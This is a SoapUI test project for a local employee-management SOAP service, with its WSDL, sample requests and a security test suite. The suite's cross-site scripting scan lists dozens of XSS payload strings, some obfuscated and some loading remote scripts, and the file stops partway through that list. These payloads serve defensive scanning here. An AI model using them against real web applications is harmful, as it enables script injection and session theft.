<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="314e7dd7-3b4b-435a-8de7-302a3443aa1f" activeEnvironment="Default" name="Soapautom" resourceRoot="" soapui-version="5.5.0" abortOnError="false" runType="SEQUENTIAL" xmlns:con="http://eviware.com/soapui/config"><con:settings/><con:interface xsi:type="con:WsdlInterface" id="fda2df43-33c5-4b8e-bfd5-d25252967b85" wsaVersion="NONE" name="EmployeeManagementServiceSoap12Binding" type="wsdl" bindingName="{http://sample.com/reservation/guest}EmployeeManagementServiceSoap12Binding" soapVersion="1_2" anonymous="optional" definition="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache/><con:endpoints><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint></con:endpoints><con:operation id="2ebc700b-49c4-41f8-89d7-998b17cb09de" isOneWay="false" action="urn:addEmployee" name="addEmployee" bindingOperationName="addEmployee" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="905d31aa-f24f-4d72-be7c-a343dc98e060" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:addEmployee>\r
         <!--Optional:-->\r
         <typ:name>?</typ:name>\r
         <!--Optional:-->\r
         <typ:id>?</typ:id>\r
         <!--Optional:-->\r
         <typ:Department>?</typ:Department>\r
         <!--Optional:-->\r
         <typ:age>?</typ:age>\r
      </typ:addEmployee>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:addEmployee"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="0785496c-260d-444d-959d-45159bc9a614" isOneWay="false" action="urn:deleteEmployee" name="deleteEmployee" bindingOperationName="deleteEmployee" type="One-Way" inputName="" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="1066df9f-f9fc-47bd-baea-6cd554087633" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:deleteEmployee>\r
         <!--Optional:-->\r
         <typ:employeeName>batmanbhaiya</typ:employeeName>\r
      </typ:deleteEmployee>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:deleteEmployee"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="f55eac0a-699e-458f-bcf2-21e967e6bc42" isOneWay="false" action="urn:getEmployeeDetails" name="getEmployeeDetails" bindingOperationName="getEmployeeDetails" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="1b9556be-d61b-45c4-9247-bcf8b772f0a3" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soap:Header/>\r
   <soap:Body>\r
      <typ:getEmployeeDetails>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:getEmployeeDetails>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:getEmployeeDetails"/></con:call></con:operation></con:interface><con:interface xsi:type="con:WsdlInterface" id="2b0aa3d9-3219-43eb-9ec7-c1824470da87" wsaVersion="NONE" name="EmployeeManagementServiceSoap11Binding" type="wsdl" bindingName="{http://sample.com/reservation/guest}EmployeeManagementServiceSoap11Binding" soapVersion="1_1" anonymous="optional" definition="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://localhost:8090/axis2/services/EmployeeManagementService?wsdl"><con:part><con:url>http://localhost:8090/axis2/services/EmployeeManagementService?wsdl</con:url><con:content><![CDATA[<wsdl:definitions targetNamespace="http://sample.com/reservation/guest" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:ns="http://sample.com/reservation/guest/types" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://sample.com/reservation/guest" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:ax21="http://exception.reservation.sample.com/xsd" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:ns1="http://org.apache.axis2/xsd" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:documentation>EmployeeManagementService</wsdl:documentation>
  <wsdl:types>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://exception.reservation.sample.com/xsd">
      <xs:complexType name="EmployeeManagementException">
        <xs:sequence>
          <xs:element minOccurs="0" name="message" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
    <xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://sample.com/reservation/guest/types" xmlns:ax22="http://exception.reservation.sample.com/xsd">
      <xs:import namespace="http://exception.reservation.sample.com/xsd"/>
      <xs:element name="EmployeeManagementServiceEmployeeManagementException">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="EmployeeManagementException" nillable="true" type="ax22:EmployeeManagementException"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetails">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="getEmployeeDetailsResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" nillable="true" type="ns:Employee"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:complexType name="Employee">
        <xs:sequence>
          <xs:element minOccurs="0" name="age" type="xs:int"/>
          <xs:element minOccurs="0" name="department" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
          <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
      <xs:element name="addEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="name" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="id" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="Department" nillable="true" type="xs:string"/>
            <xs:element minOccurs="0" name="age" type="xs:int"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="addEmployeeResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="return" type="xs:boolean"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="deleteEmployee">
        <xs:complexType>
          <xs:sequence>
            <xs:element minOccurs="0" name="employeeName" nillable="true" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
    </xs:schema>
  </wsdl:types>
  <wsdl:message name="getEmployeeDetailsRequest">
    <wsdl:part name="parameters" element="ns:getEmployeeDetails"/>
  </wsdl:message>
  <wsdl:message name="getEmployeeDetailsResponse">
    <wsdl:part name="parameters" element="ns:getEmployeeDetailsResponse"/>
  </wsdl:message>
  <wsdl:message name="EmployeeManagementServiceEmployeeManagementException">
    <wsdl:part name="parameters" element="ns:EmployeeManagementServiceEmployeeManagementException"/>
  </wsdl:message>
  <wsdl:message name="deleteEmployeeRequest">
    <wsdl:part name="parameters" element="ns:deleteEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeRequest">
    <wsdl:part name="parameters" element="ns:addEmployee"/>
  </wsdl:message>
  <wsdl:message name="addEmployeeResponse">
    <wsdl:part name="parameters" element="ns:addEmployeeResponse"/>
  </wsdl:message>
  <wsdl:portType name="EmployeeManagementServicePortType">
    <wsdl:operation name="getEmployeeDetails">
      <wsdl:input message="tns:getEmployeeDetailsRequest" wsaw:Action="urn:getEmployeeDetails"/>
      <wsdl:output message="tns:getEmployeeDetailsResponse" wsaw:Action="urn:getEmployeeDetailsResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:getEmployeeDetailsEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <wsdl:input message="tns:deleteEmployeeRequest" wsaw:Action="urn:deleteEmployee"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:deleteEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <wsdl:input message="tns:addEmployeeRequest" wsaw:Action="urn:addEmployee"/>
      <wsdl:output message="tns:addEmployeeResponse" wsaw:Action="urn:addEmployeeResponse"/>
      <wsdl:fault message="tns:EmployeeManagementServiceEmployeeManagementException" name="EmployeeManagementServiceEmployeeManagementException" wsaw:Action="urn:addEmployeeEmployeeManagementServiceEmployeeManagementException"/>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeManagementServiceSoap11Binding" type="tns:EmployeeManagementServicePortType">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceSoap12Binding" type="tns:EmployeeManagementServicePortType">
    <soap12:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
    <wsdl:operation name="getEmployeeDetails">
      <soap12:operation soapAction="urn:getEmployeeDetails" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <soap12:operation soapAction="urn:deleteEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <soap12:operation soapAction="urn:addEmployee" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
      <wsdl:fault name="EmployeeManagementServiceEmployeeManagementException">
        <soap12:fault use="literal" name="EmployeeManagementServiceEmployeeManagementException"/>
      </wsdl:fault>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="EmployeeManagementServiceHttpBinding" type="tns:EmployeeManagementServicePortType">
    <http:binding verb="POST"/>
    <wsdl:operation name="getEmployeeDetails">
      <http:operation location="getEmployeeDetails"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="deleteEmployee">
      <http:operation location="deleteEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
    </wsdl:operation>
    <wsdl:operation name="addEmployee">
      <http:operation location="addEmployee"/>
      <wsdl:input>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:input>
      <wsdl:output>
        <mime:content type="application/xml" part="parameters"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeManagementService">
    <wsdl:port name="EmployeeManagementServiceHttpSoap11Endpoint" binding="tns:EmployeeManagementServiceSoap11Binding">
      <soap:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpSoap12Endpoint" binding="tns:EmployeeManagementServiceSoap12Binding">
      <soap12:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/"/>
    </wsdl:port>
    <wsdl:port name="EmployeeManagementServiceHttpEndpoint" binding="tns:EmployeeManagementServiceHttpBinding">
      <http:address location="http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpEndpoint/"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint></con:endpoints><con:operation id="b0c35738-7ecf-467d-8b6e-63698d9c7483" isOneWay="false" action="urn:addEmployee" name="addEmployee" bindingOperationName="addEmployee" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="ec0b3c86-54a9-4259-b420-8df35af80757" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:addEmployee>\r
         <!--Optional:-->\r
         <typ:name>?</typ:name>\r
         <!--Optional:-->\r
         <typ:id>?</typ:id>\r
         <!--Optional:-->\r
         <typ:Department>?</typ:Department>\r
         <!--Optional:-->\r
         <typ:age>?</typ:age>\r
      </typ:addEmployee>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:addEmployee"/></con:call></con:operation><con:operation id="21dabccd-9b17-4aa8-ba29-0ec7bc80f6bd" isOneWay="false" action="urn:deleteEmployee" name="deleteEmployee" bindingOperationName="deleteEmployee" type="One-Way" inputName="" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="4f59b013-3d44-415c-a369-9941cbff7dfe" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:deleteEmployee>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:deleteEmployee>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:deleteEmployee"/></con:call></con:operation><con:operation id="cb8856d7-36c2-4104-b9a1-94f66b069699" isOneWay="false" action="urn:getEmployeeDetails" name="getEmployeeDetails" bindingOperationName="getEmployeeDetails" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="18acd19b-0d66-44fb-9c95-eb9ecb790c47" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap11Endpoint/</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:typ="http://sample.com/reservation/guest/types">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <typ:getEmployeeDetails>\r
         <!--Optional:-->\r
         <typ:employeeName>?</typ:employeeName>\r
      </typ:getEmployeeDetails>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="urn:getEmployeeDetails"/></con:call></con:operation></con:interface><con:testSuite id="0dc6be7c-d667-440a-846a-b9d7ffd2621f" name="TS01"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="d8d51f91-021a-4ea6-b04e-142e087a4fb0" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TC01" searchProperties="true"><con:settings/><con:testStep type="request" name="addemp1" id="68d887be-d1e9-452c-9047-dc38175314e0"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>EmployeeManagementServiceSoap12Binding</con:interface><con:operation>addEmployee</con:operation><con:request name="addemp1" id="fff7b7e4-3bd4-4985-968a-60b334d71449"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">
   <soap:Header/>
   <soap:Body>
      <typ:addEmployee>
         <!--Optional:-->
         <typ:name>ffsfdkkk</typ:name>
         <!--Optional:-->
         <typ:id>34</typ:id>
         <!--Optional:-->
         <typ:Department/>
         <!--Optional:-->
         <typ:age>32</typ:age>
      </typ:addEmployee>
   </soap:Body>
</soap:Envelope>]]></con:request><con:assertion type="SOAP Response" id="be52280a-2d0a-45b7-b717-0c1345a3ac96"/><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:properties><con:property><con:name>Name</con:name><con:value>bat</con:value></con:property></con:properties><con:securityTest id="d7301e91-5254-4f47-9f52-621c5db3dddf" name="AddempSCT" failOnError="true"><con:settings/><con:testStepSecurityTest><con:testStepId>68d887be-d1e9-452c-9047-dc38175314e0</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="c319e5ce-335c-46b8-b936-e2c87e96db09" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE 